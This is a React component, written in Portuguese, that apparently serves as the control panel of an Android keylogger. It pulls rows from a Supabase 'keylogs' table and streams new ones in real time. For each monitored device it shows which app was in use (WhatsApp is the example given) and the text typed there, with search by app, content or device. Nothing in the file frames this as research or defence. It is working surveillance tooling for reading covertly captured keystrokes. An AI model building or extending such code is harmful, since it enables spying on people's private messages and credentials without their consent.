import React, { useState, useEffect, useMemo } from 'react'
import { supabase } from '../supabaseClient'
import { Search, Radio, Wifi, WifiOff, RefreshCw } from 'lucide-react'

/**
 * Extrai apenas o último segmento do package (ex: "com.whatsapp" -> "whatsapp").
 */
function formatAppPackage(pkg) {
  if (!pkg) return 'desconhecido'
  const parts = pkg.split('.')
  return parts[parts.length - 1] || pkg
}

/**
 * Formata timestamps para exibição legível.
 */
function formatTimestamp(ts) {
  if (!ts) return new Date().toLocaleTimeString('pt-BR')
  try {
    const date = new Date(ts)
    if (isNaN(date.getTime())) return ts
    return date.toLocaleTimeString('pt-BR', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      fractionalSecondDigits: 3
    })
  } catch {
    return ts
  }
}

export default function LogTable() {
  const [logs, setLogs] = useState([])
  const [searchTerm, setSearchTerm] = useState('')
  const [isConnected, setIsConnected] = useState(false)
  const [loading, setLoading] = useState(true)

  // Carrega histórico inicial e assina eventos postgres_changes em tempo real
  useEffect(() => {
    let isMounted = true

    async function fetchInitialLogs() {
      try {
        setLoading(true)
        const { data, error } = await supabase
          .from('keylogs')
          .select('*')
          .order('id', { ascending: false })
          .limit(100)

        if (error) {
          console.error('Erro ao buscar histórico inicial do Supabase:', error)
        } else if (isMounted && data) {
          setLogs(data)
        }
      } catch (err) {
        console.error('Exceção ao carregar logs:', err)
      } finally {
        if (isMounted) setLoading(false)
      }
    }

    fetchInitialLogs()

    // Configura canal Realtime com Supabase
    const channel = supabase
      .channel('realtime_keylogs')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'keylogs',
        },
        (payload) => {
          if (!isMounted) return
          const newEntry = payload.new
          setLogs((prev) => [newEntry, ...prev.slice(0, 499)])
        }
      )
      .subscribe((status) => {
        if (status === 'SUBSCRIBED') {
          setIsConnected(true)
        } else if (status === 'CLOSED' || status === 'CHANNEL_ERROR') {
          setIsConnected(false)
        }
      })

    return () => {
      isMounted = false
      supabase.removeChannel(channel)
    }
  }, [])

  // Filtro de busca em tempo real na lista local de logs
  const filteredLogs = useMemo(() => {
    if (!searchTerm.trim()) return logs
    const query = searchTerm.toLowerCase()
    return logs.filter((log) => {
      const pkg = formatAppPackage(log.app_package || log.appPackage || '').toLowerCase()
      const content = (log.input_content || log.inputContent || '').toLowerCase()
      const device = (log.device_model || log.deviceModel || '').toLowerCase()
      return pkg.includes(query) || content.includes(query) || device.includes(query)
    })
  }, [logs, searchTerm])

  return (
    <div className="w-full flex flex-col gap-4">
      {/* Header de controles e status */}
      <div className="flex flex-col sm:flex-row items-center justify-between gap-4 p-4 rounded-xl bg-zinc-900/60 border border-zinc-800 backdrop-blur-md">
        <div className="relative w-full sm:w-96">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400" />
          <input
            type="text"
            placeholder="Filtrar por app, conteúdo ou dispositivo..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full pl-10 pr-4 py-2 text-sm bg-zinc-950/80 border border-zinc-800 rounded-lg text-zinc-100 placeholder-zinc-500 focus:outline-none focus:border-purple-500 transition-colors"
          />
        </div>

        <div className="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-end">
          <span className="text-xs text-zinc-400">
            Total: <span className="font-mono text-purple-400 font-semibold">{filteredLogs.length}</span>
          </span>

          <div className="flex items-center gap-2 px-3 py-1.5 rounded-full border border-zinc-800 bg-zinc-950 text-xs font-mono">
            {isConnected ? (
              <>
                <Wifi className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                <span className="text-emerald-400">Tempo Real</span>
              </>
            ) : (
              <>
                <WifiOff className="w-3.5 h-3.5 text-rose-400" />
                <span className="text-rose-400">Conectando...</span>
              </>
            )}
          </div>
        </div>
      </div>

      {/* Tabela de logs */}
      <div className="w-full overflow-hidden rounded-xl border border-zinc-800 bg-zinc-900/40 backdrop-blur-sm">
        <div className="overflow-x-auto">
          <table className="w-full text-left text-sm">
            <thead className="bg-zinc-900/90 text-xs text-zinc-400 uppercase tracking-wider border-b border-zinc-800">
              <tr>
                <th className="py-3 px-4 font-medium w-36">Timestamp</th>
                <th className="py-3 px-4 font-medium w-48">App Package</th>
                <th className="py-3 px-4 font-medium">Input Content</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-800/60 font-sans">
              {loading ? (
                <tr>
                  <td colSpan={3} className="py-12 text-center text-zinc-500">
                    <RefreshCw className="w-6 h-6 animate-spin mx-auto mb-2 text-purple-400" />
                    Carregando eventos do Supabase...
                  </td>
                </tr>
              ) : filteredLogs.length === 0 ? (
                <tr>
                  <td colSpan={3} className="py-12 text-center text-zinc-500">
                    Nenhum evento registrado ou correspondente à busca.
                  </td>
                </tr>
              ) : (
                filteredLogs.map((log, index) => {
                  const rawPkg = log.app_package || log.appPackage || ''
                  const simplePkg = formatAppPackage(rawPkg)
                  const content = log.input_content || log.inputContent || ''
                  const ts = log.created_at || log.timestamp

                  return (
                    <tr
                      key={log.id || `${ts}-${index}`}
                      className="hover:bg-zinc-800/40 transition-colors group"
                    >
                      <td className="py-3 px-4 text-xs font-mono text-zinc-400 whitespace-nowrap">
                        {formatTimestamp(ts)}
                      </td>
                      <td className="py-3 px-4 whitespace-nowrap">
                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-md text-xs font-medium font-mono bg-purple-950/40 border border-purple-800/40 text-purple-300 group-hover:border-purple-600 transition-colors">
                          {simplePkg}
                        </span>
                      </td>
                      <td className="py-3 px-4 text-sm font-mono text-zinc-200 break-all leading-relaxed">
                        {content}
                      </td>
                    </tr>
                  )
                })
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  )
}
